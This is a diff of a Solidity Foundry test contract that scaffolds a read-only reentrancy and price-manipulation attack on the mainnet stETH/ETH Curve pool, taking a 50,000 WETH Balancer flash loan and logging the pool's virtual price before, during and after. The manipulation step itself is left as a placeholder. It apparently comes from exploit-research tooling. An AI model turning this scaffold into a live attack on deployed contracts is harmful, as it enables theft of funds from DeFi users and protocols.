@@ -4,8 +4,6 @@ import "../PriceManipulation.sol";
 import "../../tokens/Tokens.sol";
 import "../../flashloan/FlashLoan.sol";
 
-import "../lib/CurvePriceManipulation.sol";
-
 import "forge-std/console.sol";
 import "forge-std/Test.sol";
 
@@ -13,11 +11,12 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
     using FlashLoanProvider for FlashLoanProviders;
     using PriceManipulationProvider for PriceManipulationProviders;
 
+    // stETH / ETH Curve pool
+    ICurvePool curvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
+
     function initiateAttack() external {
         console.log("---------------------------------------------------------------------------");
-        console.log(
-            "Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price()
-        );
+        console.log("Curve Virtual Price BEFORE:", curvePool.get_virtual_price());
         // Deal ether to cover fees and losses
         deal(EthereumTokens.NATIVE_ASSET, address(this), 3.5 ether);
         takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.WETH, 50000e18);
@@ -68,7 +67,7 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
 
     function _completeAttack() internal override(PriceManipulation, FlashLoan) {
         console.log("---------------------------------------------------------------------------");
-        console.log("Curve Virtual Price AFTER:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+        console.log("Curve Virtual Price AFTER:", curvePool.get_virtual_price());
         console.log("ETH   :", address(this).balance);
         console.log("WETH  :", EthereumTokens.WETH.balanceOf(address(this)));
         console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
@@ -80,9 +79,7 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             // Execute read only reentrancy
             // Caller should be curve pool
             console.log("---------------------------------------------------------------------------");
-            console.log(
-                "Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price()
-            );
+            console.log("Curve Virtual Price DURING:", curvePool.get_virtual_price());
             console.log("ETH   :", address(this).balance);
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
             console.log("Execute price manipulation attack HERE");
@@ -95,7 +92,13 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
     }
 }
 
-interface IPool {
+interface ICurvePool {
+    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
+    function add_liquidity(uint256[2] calldata amounts, uint256 minMintAmount) external payable returns (uint256);
+    function remove_liquidity(uint256 amount, uint256[2] memory minAmounts) external returns (uint256);
+    function remove_liquidity_imbalance(uint256[2] memory amounts, uint256 maxBurnAmount) external returns (uint256);
+    function balances(uint256 i) external view returns (uint256);
+    function lp_token() external view returns (address);
     function get_virtual_price() external view returns (uint256);
 }
 
